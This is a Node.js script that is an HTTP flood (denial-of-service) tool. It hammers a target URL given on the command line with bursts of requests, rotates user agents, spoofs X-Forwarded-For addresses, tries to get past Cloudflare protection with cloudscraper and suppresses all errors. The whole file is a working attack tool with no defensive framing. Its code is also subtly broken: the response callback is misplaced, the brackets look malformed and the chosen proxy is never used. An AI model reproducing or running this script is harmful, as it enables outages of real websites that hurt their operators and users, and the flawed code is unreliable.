var request = require("request");
var path = require('path');
var fs = require('fs');
var cloudscraper = require('cloudscraper');
var randomstring = require("randomstring");
var ciphers = require('ciphers');
var readline = require('readline').createInterface({
input: process.stdin,
output: process.stdout
});

requestJar = request.jar(),
reqCookie = request.defaults({
    jar: requestJar
}),
reqBypass = cloudscraper.defaults({
    jar: requestJar
}),
randomByte = function() {
    return Math.round(Math.random()*256);
}

const uaa = fs.readFileSync("ua.txt", 'utf-8').toString().split("\n");
const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().split("\n");

const url = process.argv[2]
const time = process.argv[3]


setInterval(() => {
		const proxy = proxies[Math.floor(Math.random() * proxies.length)]
		const rand = randomstring.generate({
 	       length: 5,
 	       charset: 'abcdefghijklmnopqstuvwxyz0123456789QWERTYUIOPASDFGHJKLZXCVBNM'
 	   });
		for (var i = 0; i < 16; i++) {
		request({
		method: 'GET',
		followAllRedirects: true,
		maxRedirects: 20,
		uri: url,
		gzip: true,
		jar: true,
		strictSSL: false,
		headers: {
			'Cache-Control': 'max-age=0',
    	    'Upgrade-Insecure-Requests': 1,
			'User-Agent': uaa[Math.floor(Math.random() * uaa.length)], 
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
			'Connection':'Keep-Alive',
			'Pragma': 'no-cache',
			'Accept-Encoding': 'gzip, deflate, br',
  	     	'Accept-Language': 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6',
   	        'X-Forwarded-For': randomByte() +'.' + randomByte() +'.' + randomByte() +'.' + randomByte(),
		}
	}), function (error, res) {
		if (res && res.statusCode == 403) {
			reqBypass({
				method: 'GET',
				followAllRedirects: true,
				maxRedirects: 20,
				uri: url,
				jar: true,
				gzip: true,
				cloudflareTimeout: 5000,
				cloudflareMaxTimeout: 30000,
				strictSSL: false,
				headers: {
					'Cache-Control': 'max-age=0',
					'Upgrade-Insecure-Requests': 1,
					'User-Agent': uaa[Math.floor(Math.random() * uaa.length)], 
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
					'Connection':'Keep-Alive',
					'Sec-Fetch-Mode': 'navigate',
					'Sec-Fetch-User': '?1',
					'sec-fetch-site': 'none',
					'Sec-Fetch-Dest': 'document',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6',
					'Referer': 'http://google.com/' + rand,
					'X-Forwarded-For': randomByte() +'.' + randomByte() +'.' + randomByte() +'.' + randomByte(),
				}
			})
		}
		}
		};
	})

	setTimeout(() => {
	    process.exit(0)
	}, time * 1000);

// to avoid errors
	process.on('uncaughtException', function (err) {
    // console.log(err);
	});
	process.on('unhandledRejection', function (err) {
    // console.log(err);
	});
